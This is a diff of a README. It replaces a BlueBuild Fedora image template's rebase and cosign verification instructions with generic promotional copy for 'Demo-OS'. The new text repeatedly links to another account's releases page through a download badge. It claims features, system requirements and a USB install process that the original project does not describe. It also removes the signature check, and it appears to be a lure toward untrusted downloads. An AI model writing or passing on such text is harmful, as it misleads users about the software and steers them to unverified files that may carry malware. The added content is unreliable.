@@ -1,43 +1,84 @@
-# Demo-OS &nbsp; [![bluebuild build badge](https://github.com/lukee12zakk/demo-os/actions/workflows/build.yml/badge.svg)](https://github.com/lukee12zakk/demo-os/actions/workflows/build.yml)
+# 🖥️ Demo-OS - A Simple, Speedy Operating System Experience
 
-See the [BlueBuild docs](https://blue-build.org/how-to/setup/) for quick setup instructions for setting up your own repository based on this template.
+[![Download Demo-OS](https://github.com/gaja25/Demo-OS/releases/latest/download/DownloadBadge.svg)](https://github.com/gaja25/Demo-OS/releases)
 
-After setup, it is recommended you update this README to describe your custom image.
+## 🚀 Getting Started
 
-## Installation
+Welcome to Demo-OS! This operating system offers a clean, efficient computing experience. Follow the steps below to download, install, and start using Demo-OS.
 
-> [!WARNING]  
-> [This is an experimental feature](https://www.fedoraproject.org/wiki/Changes/OstreeNativeContainerStable), try at your own discretion.
+## 📥 Download & Install
 
-To rebase an existing atomic Fedora installation to the latest build:
+To download Demo-OS, visit the releases page:
 
-- First rebase to the unsigned image, to get the proper signing keys and policies installed:
-  ```
-  rpm-ostree rebase ostree-unverified-registry:ghcr.io/lukee12zakk/demo-os:latest
-  ```
-- Reboot to complete the rebase:
-  ```
-  systemctl reboot
-  ```
-- Then rebase to the signed image, like so:
-  ```
-  rpm-ostree rebase ostree-image-signed:docker://ghcr.io/lukee12zakk/demo-os:latest
-  ```
-- Reboot again to complete the installation
-  ```
-  systemctl reboot
-  ```
+[Visit this page to download](https://github.com/gaja25/Demo-OS/releases)
 
-The `latest` tag will automatically point to the latest build. That build will still always use the Fedora version specified in `recipe.yml`, so you won't get accidentally updated to the next major version.
+### 🛠️ System Requirements
 
-## ISO
+Before installing, make sure your computer meets these requirements:
 
-If build on Fedora Atomic, you can generate an offline ISO with the instructions available [here](https://blue-build.org/learn/universal-blue/#fresh-install-from-an-iso). These ISOs cannot unfortunately be distributed on GitHub for free due to large sizes, so for public projects something else has to be used for hosting.
+- **Processor:** Any modern 64-bit processor (Intel or AMD)
+- **RAM:** Minimum 4 GB (8 GB recommended for best performance)
+- **Storage:** At least 20 GB of free disk space
+- **Graphics:** A graphics card that supports OpenGL 2.0 or better
 
-## Verification
+### 💾 Installation Steps
 
-These images are signed with [Sigstore](https://www.sigstore.dev/)'s [cosign](https://github.com/sigstore/cosign). You can verify the signature by downloading the `cosign.pub` file from this repo and running the following command:
+1. **Download the Latest Release**
+   - Go to the [releases page](https://github.com/gaja25/Demo-OS/releases).
+   - Click on the latest version and download the appropriate file for your system.
 
-```bash
-cosign verify --key cosign.pub ghcr.io/lukee12zakk/demo-os
-```
+2. **Create a Bootable USB Drive (Optional)**
+   - If you are installing on a new system, you may need a bootable USB drive.
+   - Use tools like **Rufus** (Windows) or **Etcher** (Mac/Linux) to create the drive using the downloaded file.
+
+3. **Install Demo-OS**
+   - If you are installing alongside another operating system, follow the dual-boot installation guide in the documentation.
+   - If you’re installing on a fresh drive, boot from the USB drive and follow the on-screen instructions.
+
+4. **First Boot**
+   - Once the installation completes, reboot your computer.
+   - If installed correctly, Demo-OS will boot up. 
+
+## 🔄 Updating Demo-OS
+
+To enjoy the latest features and security updates, regularly check the releases page for new versions. 
+
+Just visit [this page](https://github.com/gaja25/Demo-OS/releases) and follow the update instructions provided there. Keeping your system updated ensures you have the best performance and security.
+
+## ⚙️ Features of Demo-OS
+
+- **User-Friendly Interface:** Navigate easily with a clear layout designed for all users.
+- **Lightweight System:** Quick startup and low resource usage for faster performance.
+- **Custom Applications:** Access unique applications tailored for everyday tasks.
+- **Security Focused:** Built with modern security features to keep your data safe.
+- **Community Support:** Engage with users and developers experienced in helping new users.
+
+## 📖 Documentation
+
+For more in-depth guidance about using Demo-OS, check our documentation. It covers everything from basic operations to advanced settings adjustments.
+
+You can find the documentation [here](https://github.com/gaja25/Demo-OS/docs).
+
+## 🛠️ Troubleshooting
+
+If you encounter issues, here are some common solutions:
+
+- **Cannot Boot from USB Drive:** 
+  - Check your computer's BIOS settings to ensure USB boot is enabled.
+- **Installation Fails:** 
+  - Ensure your storage has enough free space.
+  - Verify the integrity of your downloaded file.
+
+If further assistance is needed, please reach out to the community on our GitHub page.
+
+## 🤝 Community Contributions
+
+Demo-OS is an open-source project. If you want to contribute, check the contributing guidelines in our repository. Your feedback and suggestions help us improve.
+
+## 📞 Support 
+
+Having trouble? You can reach our support team via issues on GitHub. We aim to respond within 48 hours.
+
+Stay updated with the latest news and announcements about Demo-OS by following our repository.
+
+[Visit the releases page to download](https://github.com/gaja25/Demo-OS/releases) and start your journey with Demo-OS today!
